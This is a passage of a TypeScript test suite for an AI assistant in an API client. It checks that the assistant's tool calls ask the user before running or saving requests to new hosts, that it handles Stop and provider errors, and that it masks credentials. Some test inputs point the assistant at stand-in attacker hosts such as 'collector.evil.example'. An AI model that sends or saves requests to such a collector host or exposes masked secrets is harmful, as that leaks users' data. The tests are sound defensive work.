      // `<<x>>//` may be a scheme or a whole base URL: both count.
      [
        "<<scheme>>//api.good.example/o",
        "<<scheme>>//evil.example/o",
        "<<scheme>>//evil.example",
      ],
      ["<<base>>//v1/o", "<<other>>//v1/o", "<<other>>//v1"],
      [
        "<<protocol>>://api.good.example/o",
        "<<protocol>>://<<host>>/o",
        "<<host>>",
      ],
    ])("asks before running %s moved to %s", async (from, to, host) => {
      tabs.setActiveTab(tabs.createNewTab(restTab(from, "POST")).id)
      await mount()

      const turn = runAfter("tidy it up and run it", [
        { id: "1", name: "set_url", input: { url: to } },
      ])
      await untilPrompt()
      expect(chat.pendingConfirmation.value).toMatchObject({
        kind: "run",
        hosts: [host],
      })
      chat.resolveConfirmation(false)
      await turn

      expect(sent).toEqual([])
    })

    it("runs a templated-scheme URL whose host stayed put", async () => {
      const a = tabs.createNewTab(
        restTab("<<protocol>>://api.good.example/o", "POST")
      )
      tabs.setActiveTab(a.id)
      await mount()

      await runAfter("use the v2 path and run it", [
        {
          id: "1",
          name: "set_url",
          input: { url: "<<protocol>>://api.good.example/v2/o" },
        },
      ])

      expect(sent).toEqual([a.id])
    })

    it("asks for a host that is only part of one the user typed", async () => {
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()

      const turn = runAfter("run it against https://api.github.com/user", [
        { id: "1", name: "set_url", input: { url: "https://hub.com/c" } },
      ])
      await untilPrompt()
      expect(chat.pendingConfirmation.value?.hosts).toEqual(["hub.com"])
      chat.resolveConfirmation(false)
      await turn

      expect(sent).toEqual([])
    })
  })

  it("doesn't hold the turn for a subscription's first event", async () => {
    vi.useFakeTimers()
    gqlRespond = false
    const tab = tabs.createNewTab({
      type: "gql-request",
      request: {
        ...getDefaultGQLRequest(),
        url: "https://a.example/graphql",
        query: "subscription OnMessage { message }",
      },
      isDirty: false,
      response: [],
    } as never)
    tabs.setActiveTab(tab.id)
    await mount()

    chatFn
      .mockResolvedValueOnce(
        reply([{ id: "1", name: "run_request", input: {} }])
      )
      .mockResolvedValueOnce(reply([], "ok"))
    const turn = chat.sendMessage("subscribe to OnMessage", "")
    await vi.advanceTimersByTimeAsync(1_000)
    expect(chat.isStreaming.value).toBe(false)
    await turn

    const messages = chatFn.mock.calls[1][0] as { content: unknown }[]
    const results = messages[messages.length - 1].content as {
      content: string
      is_error?: boolean
    }[]
    expect(results[0].content).toBe("▶ Running the GraphQL operation…")
    expect(results[0].is_error).toBeFalsy()

    // The first event settles the step line.
    const doc = tabs.getTabRef(tab.id).value.document
    if (doc.type === "gql-request")
      doc.response = [
        { type: "response", data: "{}", operationType: "subscription" },
      ] as never
    await nextTick()
    expect(toolSteps(chat)).toEqual([
      "✅ subscription completed — check the response panel.",
    ])
  })

  describe("save_request", () => {
    const boundTab = (originLocation: "user-collection" | "team-collection") =>
      tabs.createNewTab(
        restTab("https://a.example", "GET", {
          isDirty: true,
          saveContext:
            originLocation === "user-collection"
              ? { originLocation, folderPath: "0", requestIndex: 0 }
              : { originLocation, requestID: "req_1" },
        })
      )

    it("refuses a team save for a viewer", async () => {
      // No backend here: skip the team tree load the switch triggers.
      vi.spyOn(teamCollections, "changeTeamID").mockImplementation(() => {})
      workspace.changeWorkspace({
        type: "team",
        teamID: "team_1",
        teamName: "Acme",
        role: TeamAccessRole.Viewer,
      })
      tabs.setActiveTab(boundTab("team-collection").id)
      await mount()

      const { replies, toolResults } = await run([
        { id: "1", name: "save_request", input: {} },
      ])

      expect(saved).toEqual([])
      expect(replies[0]).toMatch(/view-only/)
      expect(toolResults[0].is_error).toBe(true)
    })

    it("reports a save that never completes", async () => {
      vi.useFakeTimers()
      onSave = () => {} // e.g. an expired session: the handler returns early
      tabs.setActiveTab(boundTab("user-collection").id)
      await mount()

      const pending = run([{ id: "1", name: "save_request", input: {} }])
      await vi.advanceTimersByTimeAsync(11_000)
      const { replies, toolResults } = await pending

      expect(replies[0]).toMatch(/didn't complete/)
      expect(toolResults[0].is_error).toBe(true)
    })

    it("reports the Save-As dialog when the binding was stale", async () => {
      onSave = (tab) => {
        if (tab.document.type === "request")
          tab.document.saveContext = undefined
      }
      tabs.setActiveTab(boundTab("user-collection").id)
      await mount()

      const { replies } = await run([
        { id: "1", name: "save_request", input: {} },
      ])

      expect(replies[0]).toMatch(/Opened the save dialog/)
    })

    it("reports the Save-As dialog at once for a binding with no request index", async () => {
      vi.useFakeTimers()
      onSave = () => {} // the pane only opens Save As
      tabs.setActiveTab(
        tabs.createNewTab(
          restTab("https://a.example", "GET", {
            isDirty: true,
            saveContext: { originLocation: "user-collection", folderPath: "0" },
          })
        ).id
      )
      await mount()

      let settled = false
      const pending = run([{ id: "1", name: "save_request", input: {} }])
      void pending.then(() => (settled = true))
      await vi.advanceTimersByTimeAsync(1_000)
      expect(settled).toBe(true)
      const { replies, toolResults } = await pending

      expect(saved).toHaveLength(1)
      expect(replies[0]).toMatch(/Opened the save dialog/)
      expect(toolResults[0].is_error).toBeFalsy()
    })

    it("saves a script the assistant wrote without asking", async () => {
      const a = boundTab("user-collection")
      tabs.setActiveTab(a.id)
      await mount()
      inner(chat).syncTurnTab()
      const prompts: string[] = []
      watch(chat.pendingConfirmation, (p) => p && prompts.push(p.kind))

      await run([
        {
          id: "1",
          name: "set_prerequest_script",
          input: { script: "pw.env.set('ok', '1')" },
        },
        { id: "2", name: "save_request", input: {} },
      ])

      expect(prompts).toEqual([])
      expect(saved).toEqual([a.id])
    })

    // A run sends once; a save sends for everyone after.
    it("still asks to save a host a run was approved for", async () => {
      const a = boundTab("user-collection")
      tabs.setActiveTab(a.id)
      await mount()
      inner(chat).syncTurnTab()
      const prompts: string[] = []
      watch(chat.pendingConfirmation, (p) => {
        if (!p) return
        prompts.push(p.kind)
        chat.resolveConfirmation(true)
      })

      await run([
        { id: "1", name: "set_url", input: { url: "https://x.example/c" } },
        { id: "2", name: "run_request", input: {} },
        { id: "3", name: "save_request", input: {} },
      ])

      expect(prompts).toEqual(["run", "save"])
      expect(saved).toEqual([a.id])
    })

    it("asks before saving a host the assistant set", async () => {
      tabs.setActiveTab(boundTab("user-collection").id)
      await mount()
      inner(chat).syncTurnTab()

      const pending = run([
        {
          id: "1",
          name: "set_url",
          input: { url: "https://collector.evil.example/c" },
        },
        { id: "2", name: "save_request", input: {} },
      ])
      await untilPrompt()
      expect(chat.pendingConfirmation.value).toMatchObject({
        kind: "save",
        hosts: ["collector.evil.example"],
      })
      chat.resolveConfirmation(false)
      const { replies, toolResults } = await pending

      expect(saved).toEqual([])
      expect(replies[1]).toMatch(/Didn't save the new host/)
      expect(toolResults[1].is_error).toBe(true)
    })

    // Team tabs outlive a switch to Personal.
    it("names the team a bound tab saves to, not the current workspace", async () => {
      workspace
        .acquireTeamListAdapter(null)
        .teamList$.next([
          { id: "team_1", name: "Acme", myRole: TeamAccessRole.Owner },
        ] as never)
      tabs.setActiveTab(
        tabs.createNewTab(
          restTab("https://a.example", "GET", {
            isDirty: true,
            saveContext: {
              originLocation: "team-collection",
              requestID: "req_1",
              teamID: "team_1",
            },
          })
        ).id
      )
      await mount()
      inner(chat).syncTurnTab()

      const pending = run([
        { id: "1", name: "set_url", input: { url: "https://x.example/c" } },
        { id: "2", name: "save_request", input: {} },
      ])
      await untilPrompt()
      expect(workspace.currentWorkspace.value.type).toBe("personal")
      expect(chat.pendingConfirmation.value).toMatchObject({
        kind: "save",
        workspace: "Acme",
      })
      chat.resolveConfirmation(false)
      await pending

      expect(saved).toEqual([])
    })
  })

  describe("save_request_to_collection", () => {
    const withRef = (name: string) => ({
      ...makeCollection({
        name,
        folders: [],
        requests: [],
        auth: { authType: "inherit", authActive: true },
        headers: [],
        variables: [],
        description: null,
        preRequestScript: "",
        testScript: "",
      }),
      _ref_id: `coll_${name}`,
    })

    it("asks again for another collection after one save was approved", async () => {
      setRESTCollections([withRef("A"), withRef("B")])
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()
      inner(chat).syncTurnTab()
      const prompts: string[] = []
      watch(chat.pendingConfirmation, (p) => {
        if (!p) return
        prompts.push(`${p.kind}:${p.name}`)
        chat.resolveConfirmation(p.name === "A")
      })

      const { replies } = await run([
        { id: "1", name: "set_url", input: { url: "https://x.example/c" } },
        {
          id: "2",
          name: "save_request_to_collection",
          input: { collection: "A" },
        },
        {
          id: "3",
          name: "save_request_to_collection",
          input: { collection: "B" },
        },
      ])

      expect(prompts).toEqual(["save:A", "save:B"])
      expect(replies[2]).toMatch(/Didn't save the new host to \*\*B\*\*/)
      expect(restCollectionStore.value.state[1].requests).toHaveLength(0)
    })
  })

  describe("with a runner tab in front", () => {
    it("runs and saves the pinned request tab", async () => {
      const a = tabs.createNewTab(
        restTab("https://a.example", "GET", {
          isDirty: true,
          saveContext: {
            originLocation: "user-collection",
            folderPath: "0",
            requestIndex: 0,
          },
        })
      )
      const runner = tabs.createNewTab({
        type: "test-runner",
        isDirty: false,
      } as never)
      tabs.setActiveTab(a.id)
      await mount()
      inner(chat).syncTurnTab()

      // The runner pane binds neither run nor save.
      tabs.setActiveTab(runner.id)
      await nextTick()
      const ran = await run([{ id: "1", name: "run_request", input: {} }])
      tabs.setActiveTab(runner.id)
      await nextTick()
      const kept = await run([{ id: "2", name: "save_request", input: {} }])

      expect(sent).toEqual([a.id])
      expect(saved).toEqual([a.id])
      expect(ran.replies[0]).toBe(OK_LINE)
      expect(kept.replies[0]).toBe("💾 Saved the request.")
    })
  })

  describe("switch_workspace", () => {
    const teams = [{ id: "team_1", name: "Acme", myRole: TeamAccessRole.Owner }]

    beforeEach(() => {
      // No backend here: skip the tree load the switch triggers.
      vi.spyOn(teamCollections, "changeTeamID").mockImplementation(() => {})
    })

    it("re-pins when the model picks the workspace the user moved to", async () => {
      vi.spyOn(
        chat as unknown as { loadTeams(): Promise<unknown> },
        "loadTeams"
      ).mockResolvedValue(teams)
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()
      const round = deferred()
      chatFn
        .mockReturnValueOnce(round.promise)
        .mockResolvedValueOnce(reply([], "done"))
      const turn = chat.sendMessage("switch to Acme and clear the env", "")
      await Promise.resolve()
      // The user clicks Acme too while the model thinks.
      workspace.changeWorkspace({
        type: "team",
        teamID: "team_1",
        teamName: "Acme",
        role: TeamAccessRole.Owner,
      })
      round.resolve(
        reply([
          { id: "1", name: "switch_workspace", input: { workspace: "Acme" } },
          { id: "2", name: "select_environment", input: { name: "none" } },
        ])
      )
      await turn

      const messages = chatFn.mock.calls[1][0] as {
        content: { content: string; is_error?: boolean }[]
      }[]
      const results = messages[messages.length - 1].content
      expect(results[0].is_error).toBeFalsy()
      expect(results[1].content).not.toMatch(/workspace changed/)
      expect(results[1].is_error).toBeFalsy()
    })

    it("doesn't switch for a turn stopped while the teams load", async () => {
      const loaded = deferred()
      const loadTeams = vi
        .spyOn(
          chat as unknown as { loadTeams(): Promise<unknown> },
          "loadTeams"
        )
        .mockReturnValue(loaded.promise)
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()
      chatFn.mockResolvedValueOnce(
        reply([
          { id: "1", name: "switch_workspace", input: { workspace: "Acme" } },
        ])
      )

      const turn = chat.sendMessage("switch to Acme", "")
      for (let i = 0; i < 50 && !loadTeams.mock.calls.length; i++) await tick(2)
      chat.stop()
      loaded.resolve(teams)
      await turn
      await tick()

      expect(workspace.currentWorkspace.value.type).toBe("personal")
    })
  })

  describe("after Stop", () => {
    it("tells the model the stopped message is cancelled", async () => {
      tabs.setActiveTab(
        tabs.createNewTab(restTab("https://a.example", "POST")).id
      )
      await mount()
      const round = deferred()
      chatFn
        .mockReturnValueOnce(round.promise)
        .mockResolvedValueOnce(reply([], "It's https://a.example."))

      const first = chat.sendMessage("run it", "")
      await Promise.resolve()
      chat.stop()
      await chat.sendMessage("what's the URL?", "")
      round.resolve(reply([{ id: "1", name: "run_request", input: {} }]))
      await first

      expect(chatFn.mock.calls[1][0]).toEqual([
        { role: "user", content: "run it" },
        { role: "assistant", content: expect.stringMatching(/pressed Stop/) },
        { role: "user", content: "what's the URL?" },
      ])
      expect(sent).toEqual([])
    })

    it("reports a request that went out before the stop", async () => {
      respond = false
      const a = tabs.createNewTab(restTab("https://a.example", "POST"))
      tabs.setActiveTab(a.id)
      await mount()
      chatFn.mockResolvedValueOnce(
        reply([{ id: "1", name: "run_request", input: {} }])
      )

      const turn = chat.sendMessage("run it", "")
      for (let i = 0; i < 100 && !sent.length; i++) await tick(2)
      chat.stop()
      await turn

      expect(sent).toEqual([a.id])
      const steps = toolSteps(chat)
      expect(steps).toHaveLength(2)
      expect(steps[0]).toMatch(/^■ Sent before the stop/)
      expect(steps[1]).toBe("■ Stopped.")

      chatFn.mockResolvedValueOnce(reply([], "It went out."))
      await chat.sendMessage("did it go out?", "")
      const history = chatFn.mock.calls[1][0] as { content: string }[]
      expect(history[1].content).toMatch(
        /Done before the stop:\n- run_request: ■ Sent/
      )
    })

    // Step lines never reach the model: "go ahead" must not re-send.
    it("tells the model what earlier steps did", async () => {
      const a = tabs.createNewTab(restTab("https://a.example/orders", "POST"))
      tabs.setActiveTab(a.id)
      await mount()
      const round = deferred()
      chatFn
        .mockResolvedValueOnce(
          reply(
            [{ id: "1", name: "run_request", input: {} }],
            "Creating the order."
          )
        )
        .mockReturnValueOnce(round.promise)
        .mockResolvedValueOnce(reply([], "It already went out."))

      const turn = chat.sendMessage("create an order", "")
      for (let i = 0; i < 200 && chatFn.mock.calls.length < 2; i++)
        await tick(5)
      expect(sent).toEqual([a.id])
      chat.stop()
      round.resolve(reply([], "late"))
      await turn
      await chat.sendMessage("ok go ahead", "")

      const history = chatFn.mock.calls[2][0] as { content: string }[]
      expect(history[1].content).toContain(
        `[The user pressed Stop: don't act on the message before this unless asked again.] Done before the stop:\n- run_request: ${OK_LINE}`
      )
    })

    it("tells the model what ran when it hits the step cap", async () => {
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()
      for (let n = 0; n < 6; n++)
        chatFn.mockResolvedValueOnce(
          reply([
            {
              id: String(n),
              name: "set_request_name",
              input: { name: `Step ${n}` },
            },
          ])
        )
      chatFn.mockResolvedValueOnce(reply([], "ok"))

      await chat.sendMessage("rename it six times", "")
      await chat.sendMessage("continue", "")

      const history = chatFn.mock.calls[6][0] as { content: string }[]
      expect(history[1].content).toMatch(
        /^\[I stopped after 6 tool steps before finishing\. These already ran; don't redo them:\n- set_request_name: ✓ Renamed/
      )
      expect(history[1].content).toContain("Step 5")
    })

    // Six set_url steps, then the cap reply; `when` picks the Stop moment.
    const stopOnCap = async (when: "typing" | "pushed") => {
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()
      for (let n = 0; n < 6; n++)
        chatFn.mockResolvedValueOnce(
          reply([
            {
              id: String(n),
              name: "set_url",
              input: { url: `https://a.example/${n}` },
            },
          ])
        )
      chatFn.mockResolvedValueOnce(reply([], "ok"))
      const capReply = () => {
        const last = chat.messages.value.at(-1)
        return last?.modelContent?.startsWith("[I stopped after") ? last : null
      }
      // Sync: fires as the cap reply is pushed, before it types a word.
      const unwatch = watch(
        () => capReply()?.content,
        (content) => {
          if (content !== undefined && (when === "pushed" || content)) {
            unwatch()
            chat.stop()
          }
        },
        { flush: "sync" }
      )
      await chat.sendMessage("try each url", "")
      unwatch()
      await chat.sendMessage("continue", "")
      return (chatFn.mock.calls[6][0] as { content: string }[])[1].content
    }

    it("lists what ran once when Stop lands on the typing step-cap reply", async () => {
      const content = await stopOnCap("typing")
      expect(content.match(/- set_url:/g)).toHaveLength(6)
      expect(content).toMatch(
        /^\[I stopped after 6 tool steps before finishing\. These already ran/
      )
      expect(content).toMatch(
        /\[The user pressed Stop: don't act on the message before this unless asked again\.\]$/
      )
    })

    it("still lists what ran when Stop drops the cap reply before it types", async () => {
      const content = await stopOnCap("pushed")
      expect(content.match(/- set_url:/g)).toHaveLength(6)
      expect(content).toMatch(
        /^\[The user pressed Stop: .*\] Done before the stop:/
      )
    })
  })

  describe("after a provider error mid-turn", () => {
    const text = "save it into API and run it"
    const historyOf = (call: number) =>
      chatFn.mock.calls[call][0] as { role: string; content: string }[]

    it("tells the model what already ran, so a retry continues", async () => {
      setRESTCollections([
        makeCollection({
          name: "API",
          folders: [],
          requests: [],
          auth: { authType: "inherit", authActive: true },
          headers: [],
          variables: [],
          description: null,
          preRequestScript: "",
          testScript: "",
        }),
      ])
      tabs.setActiveTab(
        tabs.createNewTab(restTab("https://a.example/orders", "POST")).id
      )
      await mount()
      watch(
        chat.pendingConfirmation,
        (p) => p && chat.resolveConfirmation(true)
      )
      chatFn
        .mockResolvedValueOnce(
          reply([
            {
              id: "1",
              name: "save_request_to_collection",
              input: { collection: "API" },
            },
            { id: "2", name: "run_request", input: {} },
          ])
        )
        .mockResolvedValueOnce(E.left("PROVIDER_TIMEOUT"))

      await chat.sendMessage(text, "")
      expect(chat.messages.value.at(-1)?.kind).toBe("error")
      expect(sent).toHaveLength(1)
      expect(restCollectionStore.value.state[0].requests).toHaveLength(1)

      chatFn.mockResolvedValueOnce(reply([], "Already saved and ran it."))
      await chat.sendMessage(text, "")

      expect(historyOf(2)).toEqual([
        { role: "user", content: text },
        {
          role: "assistant",
          content:
            "[The last reply failed (provider_timeout) before finishing. These already ran; on a retry, don't redo them:\n" +
            "- save_request_to_collection: 📁 Saved the request into **API**.\n" +
            `- run_request: ${OK_LINE}]`,
        },
        { role: "user", content: text },
      ])
    })

    it("keeps failed or refused tools apart, so a retry redoes them", async () => {
      setRESTCollections([
        makeCollection({
          name: "API",
          folders: [],
          requests: [],
          auth: { authType: "inherit", authActive: true },
          headers: [],
          variables: [],
          description: null,
          preRequestScript: "",
          testScript: "",
        }),
      ])
      tabs.setActiveTab(
        tabs.createNewTab(restTab("https://a.example/orders", "POST")).id
      )
      await mount()
      chatFn
        .mockResolvedValueOnce(
          reply([
            {
              id: "1",
              name: "save_request_to_collection",
              input: { collection: "Nope" },
            },
            { id: "2", name: "run_request", input: {} },
          ])
        )
        .mockResolvedValueOnce(E.left("NETWORK"))
        .mockResolvedValueOnce(reply([], "ok"))

      await chat.sendMessage(text, "")
      await chat.sendMessage(text, "")

      expect(historyOf(2)[1].content).toBe(
        "[The last reply failed (network) before finishing. These already ran; on a retry, don't redo them:\n" +
          `- run_request: ${OK_LINE}\n` +
          "These failed or were refused:\n" +
          '- save_request_to_collection: I couldn\'t find a collection named "Nope". Available: API.]'
      )
    })

    it("counts a sent run that got an error status as ran", async () => {
      response = {
        ...(ok200 as object),
        type: "failure",
        statusCode: 500,
        statusText: "Internal Server Error",
      }
      tabs.setActiveTab(
        tabs.createNewTab(restTab("https://a.example/orders", "POST")).id
      )
      await mount()
      chatFn
        .mockResolvedValueOnce(
          reply([{ id: "1", name: "run_request", input: {} }])
        )
        .mockResolvedValueOnce(E.left("PROVIDER_TIMEOUT"))
        .mockResolvedValueOnce(reply([], "ok"))

      await chat.sendMessage("create the order", "")
      await chat.sendMessage("retry", "")

      expect(sent).toHaveLength(1)
      // The model still reads the run as an error...
      const step2 = chatFn.mock.calls[1][0] as {
        content: string | { is_error?: boolean }[]
      }[]
      expect(step2.at(-1)?.content).toMatchObject([{ is_error: true }])
      // ...but a retry mustn't send the POST again.
      expect(historyOf(2)[1].content).toBe(
        "[The last reply failed (provider_timeout) before finishing. These already ran; on a retry, don't redo them:\n" +
          "- run_request: ⚠️ Response: **500 Internal Server Error** · 3 ms · 2 B]"
      )
    })

    it("counts a collection run with no assertions as ran", async () => {
      setRESTCollections([
        makeCollection({
          name: "API",
          folders: [],
          requests: [getDefaultRESTRequest()],
          auth: { authType: "inherit", authActive: true },
          headers: [],
          variables: [],
          description: null,
          preRequestScript: "",
          testScript: "",
        }),
      ])
      await mount()
      vi.spyOn(runner, "runTests").mockImplementation((tab) => {
        const doc = tab.value.document
        doc.testRunnerMeta = {
          completedRequests: 1,
          totalRequests: 1,
          totalTime: 3,
          failedTests: 0,
          passedTests: 0,
          totalTests: 0,
        }
        doc.status = "stopped"
        return undefined as never
      })

      const { toolResults, outcomes } = await run([
        { id: "1", name: "run_collection", input: { collection: "API" } },
      ])

      expect(toolResults[0]).toMatchObject({ is_error: true })
      expect(outcomes[0].line).toMatch(/no test assertions executed/)
      expect(outcomes[0].failed).toBe(false)
    })

    it("keeps a credential masked in that note", async () => {
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()
      const secret = "f9e8d7c6b5a43210"
      const id = (
        chat as unknown as { captureLocalSecret(s: string): string }
      ).captureLocalSecret(secret)
      chatFn
        .mockResolvedValueOnce(
          reply([
            {
              id: "1",
              name: "set_url",
              input: { url: `https://a.example/?key=<<local-ref:${id}>>` },
            },
          ])
        )
        .mockResolvedValueOnce(E.left("NETWORK"))
        .mockResolvedValueOnce(reply([], "ok"))

      await chat.sendMessage("add the key", "")
      await chat.sendMessage("add the key", "")

      const note = historyOf(2)[1].content
      expect(note).toContain(`?key=<<local-ref:${id}>>`)
      expect(note).not.toContain(secret)
    })

    it("never cuts a ref between its closing brackets", async () => {
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()
      const id = (
        chat as unknown as { captureLocalSecret(s: string): string }
      ).captureLocalSecret("f9e8d7c6b5a43210")
      const ref = `<<local-ref:${id}>>`
      // Walks the cut across the whole ref, `>>` included.
      for (let k = 90; k < 130; k++) {
        const url = `https://a.example/${"p".repeat(k)}?key=${ref}`
        const { outcomes } = await run([
          { id: String(k), name: "set_url", input: { url } },
        ])
        const line = outcomes[0].line
        expect(line.includes("<<") ? line.includes(ref) : true).toBe(true)
      }
    })

    it("fits a long turn's note without cutting it", async () => {
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()
      const calls = Array.from({ length: 30 }, (_, n) => ({
        id: String(n),
        name: "set_url",
        input: { url: `https://a.example/${"p".repeat(40)}/${n}` },
      }))
      chatFn
        .mockResolvedValueOnce(reply(calls))
        .mockResolvedValueOnce(E.left("PROVIDER_TIMEOUT"))
        .mockResolvedValueOnce(reply([], "ok"))

      await chat.sendMessage("try each url", "")
      await chat.sendMessage("go on", "")

      const note = historyOf(2)[1].content
      expect(note.length).toBeLessThanOrEqual(800)
      expect(note).toMatch(/\n- …\d+ more\]$/)
      expect(note).not.toMatch(/omitted/)
    })

    it("says no tool ran when the first step fails", async () => {
      chatFn
        .mockResolvedValueOnce(E.left("PROVIDER_TIMEOUT"))
        .mockResolvedValueOnce(reply([], "ok"))

      await chat.sendMessage(text, "")
      await chat.sendMessage(text, "")

      expect(historyOf(1)).toEqual([
        { role: "user", content: text },
        {
          role: "assistant",
          content:
            "[The last reply failed (provider_timeout) before finishing; no tool ran.]",
        },
        { role: "user", content: text },
      ])
    })
  })

  it("echoes a tab holding a resolved credential by its reference", async () => {
    // The first tab: switch_tab comes back to it and describes it.
    const a = tabs.getActiveTabs().value[0]
    tabs.createNewTab(restTab("https://b.example"))
    tabs.setActiveTab(a.id)
    await mount()
    inner(chat).syncTurnTab()
    const secret = "f9e8d7c6b5a43210"
    const id = (
      chat as unknown as { captureLocalSecret(s: string): string }
    ).captureLocalSecret(secret)

    const { toolResults } = await run([
      {
        id: "1",
        name: "set_url",
        input: { url: `https://api.example/<<local-ref:${id}>>/users` },
      },
      { id: "2", name: "switch_tab", input: { direction: "first" } },
    ])

    const doc = tabs.getTabRef(a.id).value.document
    expect(doc.type === "request" && doc.request.endpoint).toContain(secret)
    expect(toolResults[1].content).toContain(
      `https://api.example/<<local-ref:${id}>>/users`
    )
    expect(toolResults.map((r) => r.content).join("\n")).not.toContain(secret)
  })

  // "admin" also names paths and roles; masking it there hides them.
  it("masks a short credential only where it stands alone", async () => {
    tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
    await mount()
    inner(chat).syncTurnTab()
    const capture = (s: string) =>
      (
        chat as unknown as { captureLocalSecret(s: string): string }
      ).captureLocalSecret(s)
    capture("admin")
    const id = capture("s3cr3t")

    const { toolResults } = await run([
      {
        id: "1",
        name: "set_url",
        input: {
          url: "https://api.example/admin/users?role=admin&key=s3cr3t&s3cr3tive=1",
        },
      },
    ])

    expect(toolResults[0].content).toContain(
      `https://api.example/admin/users?role=admin&key=<<local-ref:${id}>>&s3cr3tive=1`
    )
  })

  // The model copies what it saw: the ref must put back that exact text.
  describe("a credential the context shows encoded", () => {
    const capture = (s: string) =>
      (
        chat as unknown as { captureLocalSecret(s: string): string }
      ).captureLocalSecret(s)
    const docOf = (id: string) => {
      const doc = tabs.getTabRef(id).value.document
      if (doc.type !== "request") throw new Error("not a request tab")
      return doc
    }

    it.each([
      [
        "Zx9+kQ/w==AbC1",
        "https://api.example/v1?sig=Zx9%2BkQ%2Fw%3D%3DAbC1&page=1",
      ],
      [
        "p&ss=w0rd#12",
        "https://api.example/login?pw=p%26ss%3Dw0rd%2312&page=1",
      ],
    ])("keeps %s URL-encoded", async (secret, url) => {
      const tab = tabs.createNewTab(restTab(url))
      tabs.setActiveTab(tab.id)
      await mount()
      inner(chat).syncTurnTab()
      capture(secret)

      const masked = chat.maskLocalSecrets(url)
      expect(masked).not.toContain(encodeURIComponent(secret))
      const { toolResults } = await run([
        {
          id: "1",
          name: "set_url",
          input: { url: masked.replace("page=1", "page=2") },
        },
      ])

      expect(docOf(tab.id).request.endpoint).toBe(
        url.replace("page=1", "page=2")
      )
      expect(toolResults[0].content).not.toContain(encodeURIComponent(secret))
    })

    it("keeps a JSON-escaped one escaped", async () => {
      const secret = 'pa"ss\\w0rd99'
      const body = JSON.stringify({ pw: secret, n: 1 })
      const tab = tabs.createNewTab(
        restTab("https://api.example/login", "POST")
      )
      docOf(tab.id).request.body = { contentType: "application/json", body }
      tabs.setActiveTab(tab.id)
      await mount()
      inner(chat).syncTurnTab()
      capture(secret)

      const masked = chat.maskLocalSecrets(body)
      expect(masked).not.toContain("w0rd99")
      await run([
        {
          id: "1",
          name: "set_body",
          input: {
            body: masked.replace('"n":1', '"n":2'),
            contentType: "application/json",
          },
        },
      ])

      const after = docOf(tab.id).request.body
      expect(JSON.parse("body" in after ? String(after.body) : "")).toEqual({
        pw: secret,
        n: 2,
      })
    })
  })

  describe("a literal [REDACTED] in the user's own data", () => {
    const SCRIPT =
      'pw.test("masks", () => pw.expect(pw.response.body.password).toBe("[REDACTED]"))'
    /** Opens a tab whose test asserts masking; returns its request, live. */
    const withScript = async () => {
      const tab = tabs.createNewTab(restTab("https://api.example/me"))
      const request = () => {
        const doc = tabs.getTabRef(tab.id).value.document
        if (doc.type !== "request") throw new Error("not a request tab")
        return doc.request
      }
      request().testScript = SCRIPT
      tabs.setActiveTab(tab.id)
      await mount()
      inner(chat).syncTurnTab()
      return request
    }

    it("lets an edit keep the one the field holds", async () => {
      const request = await withScript()
      const next = `${SCRIPT}\npw.test("200", () => pw.expect(pw.response.status).toBe(200))`

      const { toolResults } = await run([
        { id: "1", name: "set_test_script", input: { script: next } },
      ])

      expect(toolResults[0].is_error).toBeFalsy()
      expect(request().testScript).toBe(next)
    })

    it("still refuses a marker copied into another field", async () => {
      const request = await withScript()

      const { toolResults } = await run([
        {
          id: "1",
          name: "add_or_update_headers",
          input: {
            headers: [{ key: "Authorization", value: "Bearer [REDACTED]" }],
          },
        },
      ])

      expect(toolResults[0].content).toMatch(/redacted; ask the user/)
      expect(toolResults[0].is_error).toBe(true)
      expect(request().headers).toEqual([])
    })
  })

  describe("unknown tools", () => {
    it("says so instead of reporting Done", async () => {
      const { replies, toolResults } = await run([
        { id: "1", name: "set_auth", input: {} },
      ])

      expect(replies).toEqual(["⚠️ Unknown tool `set_auth` — nothing changed."])
      expect(toolResults[0].is_error).toBe(true)
    })

    it("says so even with no request tab open", async () => {
      const runner = tabs.createNewTab({
        type: "test-runner",
        isDirty: false,
      } as never)
      tabs.setActiveTab(runner.id)

      const { replies } = await run([{ id: "1", name: "set_auth", input: {} }])

      expect(replies[0]).toMatch(/Unknown tool/)
    })

    it("still routes known edit tools", async () => {
      await mount()
      const { replies } = await run([
        { id: "1", name: "set_method", input: { method: "PUT" } },
        { id: "2", name: "set_query", input: { query: "{ a }" } },
      ])

      expect(replies[0]).toMatch(/PUT/)
      expect(replies[1]).toMatch(/GraphQL request tabs/)
    })
  })

  describe("follow-up chips", () => {
    const apiCollection = () =>
      makeCollection({
        name: "API",
        folders: [],
        requests: [],
        auth: { authType: "inherit", authActive: true },
        headers: [],
        variables: [],
        description: null,
        preRequestScript: "",
        testScript: "",
      })

    /** One agent turn that makes `calls`, then answers. */
    const turn = async (calls: ToolCall[]) => {
      chatFn
        .mockResolvedValueOnce(reply(calls))
        .mockResolvedValueOnce(reply([], "done"))
      await chat.sendMessage("go", "")
    }

    it("skips a run that was refused", async () => {
      tabs.setActiveTab(tabs.createNewTab(restTab("")).id)
      await mount()

      await turn([{ id: "1", name: "run_request", input: {} }])

      expect(toolSteps(chat).join("\n")).toMatch(/no URL yet/)
      expect(chat.lastTurnTools.value).toEqual([])
    })

    it("counts a run that went out, even a failing one", async () => {
      response = { ...(ok200 as object), statusCode: 500 }
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()

      await turn([{ id: "1", name: "run_request", input: {} }])

      expect(sent).toHaveLength(1)
      expect(chat.lastTurnTools.value).toEqual(["run_request"])
    })

    it("flags an upsert that wrote no tests", async () => {
      setRESTCollections([apiCollection()])
      await mount()

      await turn([
        {
          id: "1",
          name: "add_or_update_collection_requests",
          input: {
            collection: "API",
            requests: [
              { name: "login", method: "GET", url: "https://api.example" },
            ],
          },
        },
      ])

      expect(chat.lastTurnTools.value).toEqual([
        "add_or_update_collection_requests",
